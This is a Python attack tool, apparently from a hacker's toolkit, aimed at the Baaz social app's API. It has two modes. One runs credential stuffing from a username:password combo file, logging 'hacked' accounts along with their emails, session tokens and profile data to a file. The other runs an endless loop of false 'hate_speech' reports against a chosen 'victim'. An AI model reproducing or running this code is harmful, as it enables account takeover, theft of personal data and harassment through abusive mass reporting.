
try:
	from requests import get , post
	from time import sleep
	from threading import Lock
	Lists='V4^c_Yf4TEw'
except Exception as Joker:exit(Joker)
PRNT = Lock()
def vv1ck(*a, **b):
	with PRNT:
		print(*a, **b)
red = "\033[1;31;40m";yel = '\033[1;33;40m';grn = '\033[1;32;40m';wit = "\033[1;37;40m";bloFT = "\033[1;36;40m"


class CLASS_BRUTE_FORCE_BAAZ:
	def __init__(self):
		self.errorUP='"username_or_password_invalid"'
		self.EmailUser_File()
	
	def FETCH_INFORMATION(self,token,username,password):
		INFO = get('https://api.www.baaz.com/api/2.4/me',headers={'Host': 'api.www.baaz.com','Content-Type': 'application/json','User-Agent': 'Baaz/1 CFNetwork/1240.0.4 Darwin/20.5.0','Connection': 'keep-alive','Accept': '*/*','Accept-Language': 'ar','Authorization': f'Bearer {token}','Accept-Encoding': 'gzip, deflate, br','User-Lang': 'ar_AR'})
		try:
			ALL_DATA = "login : {}:{}\nId : {}\nusername : {}\nemail : {}\ncountry : {}\nfollowers : {}\nfollowing : {}\nToken (sessionid) : {}\n===============".format(username,password,INFO.json()['id'],INFO.json()['profile_url_name'],INFO.json()['email'],INFO.json()['country'],INFO.json()['followers_amount'],INFO.json()['following_amount'],token)
			with open('Hacked-Baaz-App.txt', 'a') as J:J.write(ALL_DATA+'\n')
		except KeyError:
			with open('Hacked-Baaz-App.txt', 'a') as J:J.write(username+':'+password+'\n')
	def CHECK_LOGIN(self,username,password):
		sleep(1.5)
		sent = post('https://api.www.baaz.com/api/2.4/tokens',headers={'Host': 'api.www.baaz.com','Content-Type': 'application/json','Accept-Encoding': 'gzip, deflate, br','User-Agent': 'Baaz/1 CFNetwork/1240.0.4 Darwin/20.5.0','Connection': 'keep-alive','Accept': '*/*','Accept-Language': 'ar','Content-Length': '111','User-Lang': 'ar_AR'},json={"client_id":"api","password":password,"grant_type":"password","username":username,"country":"JO"})
		if 'access_token' in sent.text:
			vv1ck(f'{grn}[$] Hacked >> {username}:{password}')
			token = sent.json()['access_token']
			self.FETCH_INFORMATION(token,username,password)
		elif self.errorUP in sent.text:
			vv1ck(f'{red}[-] Not Hacked >> {username}:{password}')
		else:print(sent)
	def EmailUser_File(self):
		QTR = input('\n[+] Enter the name the combo  file: ')
		try:
			vv1ck('\n\t ━━━━━━━━━━━━ Started ━━━━━━━━━━━━\n')
			sleep(0.5)
			for x in open(QTR,'r').read().splitlines():
				if x ==None:exit('\n     ========== completed =========')
				try:username = x.split(":")[0]
				except IndexError:exit('\n     ========== completed =========')
				try:
					password = x.split(":")[1]
					self.CHECK_LOGIN(username,password)
				except IndexError:pass
		except FileNotFoundError:
			vv1ck('\n[-] The file name is incorrect !\n')
			return self.EmailUser_File()

###########################
class CLASS_REPORT_FOR_BAAZ:
	def __init__(self):
		self.dn = 0
		self.er = 0
		self.errorUP='"username_or_password_invalid"'
		self.LOGIN_BAAZ()
	def SENT_REPORT(self,id,token):
		while 1:
			sleep(2)
			sentRP = post('https://api.www.baaz.com/api/2.4/meta/complaints',headers={'Host': 'api.www.baaz.com','Content-Type': 'application/json','Accept-Language': 'ar-JO;q=1.0, en-JO;q=0.9','Content-Length': '86','Accept': '*/*','Connection': 'keep-alive','Origin': 'https://baaz.com','User-Agent': 'Baaz/3.30.0 (com.baaz; build:1; iOS 14.6.0) Alamofire/5.4.4','Authorization': f'Bearer {token}','Accept-Encoding': 'gzip','User-Lang': 'ar_AR'},json={"category":"hate_speech","entity_id":id,"entity_type":"user"}).text
			if 'reporter_id' in sentRP:
				self.dn+=1
				print(f'\r[$]{grn}Successfully : [{self.dn}] | {red}Errors : [{self.er}]\r',end='')
			else:
				self.er+=1
				print(f'\r[$]{grn}Successfully : [{self.dn}] | {red}Errors : [{self.er}]\r',end='')
	def GET_USER_ID(self,token,Target):
		headers={
			'Host': 'api.www.baaz.com',
			'Content-Type': 'application/json',
			'Accept': '*/*',
			'Connection': 'keep-alive',
			'Origin': 'https://baaz.com',
			'User-Agent': 'Baaz/1 CFNetwork/1240.0.4 Darwin/20.5.0',
			'Authorization': f'Bearer {token}',
			'Accept-Encoding': 'gzip, deflate, br',
			'User-Lang': 'ar_AR'}
		GetDT = get(f'https://api.www.baaz.com/api/2.4/search/people/extended?limit=30&offset=0&query={Target}',headers=headers)
		try:
			id = GetDT.json()['data'][0]['id']
			self.SENT_REPORT(id,token)
		except IndexError:vv1ck('[-] We did not find the user !')
		except KeyError:vv1ck('[-] We did not find the user !')
	def LOGIN_BAAZ(self):
		username=input('┌──(joker㉿root)-[~Baaz.exe]\n└─$ Enter Your username/email : ')
		password=input('└─$ Enter Your password : ')
		if username == "":
			vv1ck('Oops , It looks like you entered insufficient information, try again !')
			return self.LOGIN_BAAZ()
		sent = post('https://api.www.baaz.com/api/2.4/tokens',headers={'Host': 'api.www.baaz.com','Content-Type': 'application/json','Accept-Encoding': 'gzip, deflate, br','User-Agent': 'Baaz/1 CFNetwork/1240.0.4 Darwin/20.5.0','Connection': 'keep-alive','Accept': '*/*','Accept-Language': 'ar','Content-Length': '111','User-Lang': 'ar_AR'},json={"client_id":"api","password":password,"grant_type":"password","username":username,"country":"JO"})
		if 'access_token' in sent.text:
			vv1ck(f'[$] Done Login ✅')
			Target = input(f"{bloFT}┌──(joker㉿root)-[{wit}~Baaz.exe{bloFT}]\n└─${wit} Enter the victim's name : ")
			token = sent.json()['access_token']
			self.GET_USER_ID(token,Target)
		elif self.errorUP in sent.text:
			vv1ck(f'[-] Not login >>Errors >> {username}:{password}')
		else:print(sent)

if __name__ == '__main__':
	mode=input(f"""

  ____                   {red} _______          _      
 {wit}|  _ \                  {red}|__   __|        | |     
 {wit}| |_) | __ _  __ _ ____    {red}| | ___   ___ | |___  
 {wit}|  _ < / _` |/ _` |_  /    {red}| |/ _ \ / _ \| / __| 
 {wit}| |_) | (_| | (_| |/ /     {red}| | (_) | (_) | \__ \ 
 {wit}|____/ \__,_|\__,_/___|    {red}|_|\___/ \___/|_|___/ 
               By JOKER | IG: @221298
		webSite: https://vv1ck.github.io                           

{bloFT}┌──(joker㉿root)-[{wit}~Baaz.exe{bloFT}]
└─${wit} (1) >> {yel}Brute Force{wit} [email/user:pass]
    (2) >> {red}Reporting{wit}  [username]
    (99) >> Exit..

[$] Enter the number >> """)
	if mode == '1':CLASS_BRUTE_FORCE_BAAZ()
	elif mode == '2':CLASS_REPORT_FOR_BAAZ()
	else:
		vv1ck('<J> see you soon ~By Joker @221298 </J>');sleep(3);exit()
